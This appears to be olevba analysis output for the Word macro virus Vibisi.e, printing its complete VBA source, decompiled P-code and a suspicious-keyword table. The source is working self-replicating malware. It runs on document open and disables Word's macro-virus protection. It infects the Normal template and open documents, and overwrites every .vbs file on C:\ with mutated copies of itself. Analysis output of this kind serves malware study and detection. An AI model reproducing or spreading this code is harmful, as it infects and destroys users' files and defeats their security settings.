olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vibisi.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vibisi.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vbs.bas 
in file: Virus.MSWord.Vibisi.e - OLE stream: 'Macros/VBA/vbs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub vibisi() '
On Error Resume Next '
Dim fso, f, wo, nucode, code, jcode '
nucode = "" '
code = "" '
jcode = "" '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
full = f.readall '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
For i = 1 To 200 '
code = f.readline '
For j = 1 To Int(Rnd * 30): jcode = jcode & Chr(65 + Int(Rnd * 22)): Next '
nucode = nucode & code & Chr(39) & jcode & vbCr '
If Int(Rnd * 3) = 2 Then nucode = nucode & vbCr & Chr(39) & jcode & vbCr '
jcode = "" '
If code = "" Then Exit For '
code = "" '
Next '
Set f = fso.opentextfile(wscript.scriptfullname, 2, True) '
f.writeline nucode '
Set wo = CreateObject("word.application") '
With wo.Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
Set f = Nothing '
For i = 1 To wo.Application.FileSearch.FoundFiles.Count '
If wo.Application.FileSearch.FoundFiles(i) <> wscript.scriptfullname Then '
Set f = fso.opentextfile(wo.Application.FileSearch.FoundFiles(i), 2, True) '
f.writeline full '
End If '
Next '
wo.Options.VirusProtection = (Rnd * 0) '
wo.Options.SaveNormalPrompt = (Rnd * 0) '
wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname '
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs" '
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1 '
wo.NormalTemplate.Save '
wo.Quit '
End Sub '
Sub autoopen() '
On Error Resume Next '
Dim v(2000): t = Chr(39) '
Options.VirusProtection = (Rnd * 0) '
Options.SaveNormalPrompt = (Rnd * 0) '
For i = 1 To ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines '
jc = "" '
d = Int(Rnd * 3) '
p = InStr(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), t) '
If p = 0 Then GoTo e_ '
If p = 2 And lin > 100 Then '
v(i) = "": d = 1: GoTo n_ '
End If '
v(i) = Left(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), (p - 1)) '
For j = 1 To Int(75 - (Rnd * 20))  '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & Chr(32) & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
e_: '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile("c:\scriptO8.ini", 2, True) '
f.write "Attribute VB_Name = ""vbs""" & vbCr '
f.write vc '
If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini" '
If Len(ActiveDocument.VBProject.VBComponents("vbs").Name) = 0 Then '
ActiveDocument.VBProject.VBComponents.Import "c:\scriptO8.ini" '
ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
With Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
For x = 1 To Application.FileSearch.FoundFiles.Count '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(Application.FileSearch.FoundFiles(x), 2, True) '
codex = "call vibisi '" & Chr(13) & vc '
f.write codex '
Next '
End Sub '
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vibisi.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/vbs - 13009 bytes
' Line #0:
' 	FuncDefn (Sub vibisi())
' 	QuoteRem 0x000C 0x0000 ""
' Line #1:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0014 0x0000 ""
' Line #2:
' 	Dim 
' 	VarDefn fso
' 	VarDefn False
' 	VarDefn wo
' 	VarDefn nucode
' 	VarDefn code
' 	VarDefn jcode
' 	QuoteRem 0x0023 0x0000 ""
' Line #3:
' 	LitStr 0x0000 ""
' 	St nucode 
' 	QuoteRem 0x000B 0x0000 ""
' Line #4:
' 	LitStr 0x0000 ""
' 	St code 
' 	QuoteRem 0x0009 0x0000 ""
' Line #5:
' 	LitStr 0x0000 ""
' 	St jcode 
' 	QuoteRem 0x000B 0x0000 ""
' Line #6:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' 	QuoteRem 0x0034 0x0000 ""
' Line #7:
' 	SetStmt 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	LitDI2 0x0001 
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0002 
' 	Set False 
' 	QuoteRem 0x0033 0x0000 ""
' Line #8:
' 	Ld False 
' 	MemLd readall 
' 	St full 
' 	QuoteRem 0x0010 0x0000 ""
' Line #9:
' 	SetStmt 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	LitDI2 0x0001 
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0002 
' 	Set False 
' 	QuoteRem 0x0033 0x0000 ""
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	For 
' 	QuoteRem 0x0010 0x0000 ""
' Line #11:
' 	Ld False 
' 	MemLd readline 
' 	St code 
' 	QuoteRem 0x0011 0x0000 ""
' Line #12:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld jcode 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St jcode 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0049 0x0000 ""
' Line #13:
' 	Ld nucode 
' 	Ld code 
' 	Concat 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld jcode 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St nucode 
' 	QuoteRem 0x0030 0x0000 ""
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld nucode 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld jcode 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St nucode 
' 	EndIf 
' 	QuoteRem 0x0049 0x0000 ""
' Line #15:
' 	LitStr 0x0000 ""
' 	St jcode 
' 	QuoteRem 0x000A 0x0000 ""
' Line #16:
' 	Ld code 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' 	QuoteRem 0x001A 0x0000 ""
' Line #17:
' 	LitStr 0x0000 ""
' 	St code 
' 	QuoteRem 0x0009 0x0000 ""
' Line #18:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0004 0x0000 ""
' Line #19:
' 	SetStmt 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x0039 0x0000 ""
' Line #20:
' 	Ld nucode 
' 	Ld False 
' 	ArgsMemCall writeline 0x0001 
' 	QuoteRem 0x0012 0x0000 ""
' Line #21:
' 	SetStmt 
' 	LitStr 0x0010 "word.application"
' 	ArgsLd CreateObject 0x0001 
' 	Set wo 
' 	QuoteRem 0x0029 0x0000 ""
' Line #22:
' 	StartWithExpr 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	With 
' 	QuoteRem 0x001E 0x0000 ""
' Line #23:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' 	QuoteRem 0x000F 0x0000 ""
' Line #24:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' 	QuoteRem 0x0019 0x0000 ""
' Line #25:
' 	LitStr 0x0005 "*.vbs"
' 	MemStWith FileName 
' 	QuoteRem 0x0013 0x0000 ""
' Line #26:
' 	ArgsMemCallWith Execute 0x0000 
' 	QuoteRem 0x0008 0x0000 ""
' Line #27:
' 	EndWith 
' 	QuoteRem 0x0008 0x0000 ""
' Line #28:
' 	SetStmt 
' 	LitNothing 
' 	Set False 
' 	QuoteRem 0x000F 0x0000 ""
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x0037 0x0000 ""
' Line #30:
' 	Ld i 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x0049 0x0000 ""
' Line #31:
' 	SetStmt 
' 	Ld i 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x004A 0x0000 ""
' Line #32:
' 	Ld full 
' 	Ld False 
' 	ArgsMemCall writeline 0x0001 
' 	QuoteRem 0x0010 0x0000 ""
' Line #33:
' 	EndIfBlock 
' 	QuoteRem 0x0006 0x0000 ""
' Line #34:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0004 0x0000 ""
' Line #35:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld wo 
' 	MemLd Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0026 0x0000 ""
' Line #36:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld wo 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0027 0x0000 ""
' Line #37:
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	QuoteRem 0x0046 0x0000 ""
' Line #38:
' 	LitStr 0x0003 "vbs"
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' 	QuoteRem 0x0065 0x0000 ""
' Line #39:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' 	QuoteRem 0x004B 0x0000 ""
' Line #40:
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0016 0x0000 ""
' Line #41:
' 	Ld wo 
' 	ArgsMemCall Quit 0x0000 
' 	QuoteRem 0x0007 0x0000 ""
' Line #42:
' 	EndSub 
' 	QuoteRem 0x0007 0x0000 ""
' Line #43:
' 	FuncDefn (Sub autoopen())
' 	QuoteRem 0x000E 0x0000 ""
' Line #44:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0000 ""
' Line #45:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x07D0 
' 	VarDefn v
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St t 
' 	QuoteRem 0x0018 0x0000 ""
' Line #46:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0023 0x0000 ""
' Line #47:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0024 0x0000 ""
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' 	QuoteRem 0x0050 0x0000 ""
' Line #49:
' 	LitStr 0x0000 ""
' 	St jc 
' 	QuoteRem 0x0008 0x0000 ""
' Line #50:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St d 
' 	QuoteRem 0x0011 0x0000 ""
' Line #51:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld t 
' 	FnInStr 
' 	St p 
' 	QuoteRem 0x0050 0x0000 ""
' Line #52:
' 	Ld p 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo e_ 
' 	EndIf 
' 	QuoteRem 0x0016 0x0000 ""
' Line #53:
' 	Ld p 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld lin 
' 	LitDI2 0x0064 
' 	Gt 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x001C 0x0000 ""
' Line #54:
' 	LitStr 0x0000 ""
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St d 
' 	BoS 0x0000 
' 	GoTo n_ 
' 	QuoteRem 0x001A 0x0000 ""
' Line #55:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #56:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0058 0x0000 ""
' Line #57:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	QuoteRem 0x0023 0x0000 ""
' Line #58:
' 	Ld jc 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St jc 
' 	QuoteRem 0x0024 0x0000 ""
' Line #59:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0000 ""
' Line #60:
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0015 0x0000 ""
' Line #61:
' 	Ld d 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	EndIf 
' 	QuoteRem 0x0034 0x0000 ""
' Line #62:
' 	Ld vc 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x0016 0x0000 ""
' Line #63:
' 	Label n_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0000 ""
' Line #65:
' 	Label e_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #66:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' 	QuoteRem 0x0035 0x0000 ""
' Line #67:
' 	SetStmt 
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x0035 0x0000 ""
' Line #68:
' 	LitStr 0x0019 "Attribute VB_Name = "vbs""
' 	Ld vbCr 
' 	Concat 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' 	QuoteRem 0x002C 0x0000 ""
' Line #69:
' 	Ld vc 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' 	QuoteRem 0x000B 0x0000 ""
' Line #70:
' 	LitStr 0x0003 "vbs"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' 	QuoteRem 0x0081 0x0000 ""
' Line #71:
' 	LitStr 0x0003 "vbs"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0042 0x0000 ""
' Line #72:
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	QuoteRem 0x003E 0x0000 ""
' Line #73:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	QuoteRem 0x002D 0x0000 ""
' Line #74:
' 	EndIfBlock 
' 	QuoteRem 0x0006 0x0000 ""
' Line #75:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' 	QuoteRem 0x001B 0x0000 ""
' Line #76:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' 	QuoteRem 0x000F 0x0000 ""
' Line #77:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' 	QuoteRem 0x001A 0x0000 ""
' Line #78:
' 	LitStr 0x0005 "*.vbs"
' 	MemStWith FileName 
' 	QuoteRem 0x0013 0x0000 ""
' Line #79:
' 	ArgsMemCallWith Execute 0x0000 
' 	QuoteRem 0x0008 0x0000 ""
' Line #80:
' 	EndWith 
' 	QuoteRem 0x0008 0x0000 ""
' Line #81:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x0034 0x0000 ""
' Line #82:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' 	QuoteRem 0x0034 0x0000 ""
' Line #83:
' 	SetStmt 
' 	Ld x 
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x0047 0x0000 ""
' Line #84:
' 	LitStr 0x000D "call vibisi '"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vc 
' 	Concat 
' 	St codex 
' 	QuoteRem 0x0026 0x0000 ""
' Line #85:
' 	Ld codex 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' 	QuoteRem 0x000D 0x0000 ""
' Line #86:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0004 0x0000 ""
' Line #87:
' 	EndSub 
' 	QuoteRem 0x0007 0x0000 ""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

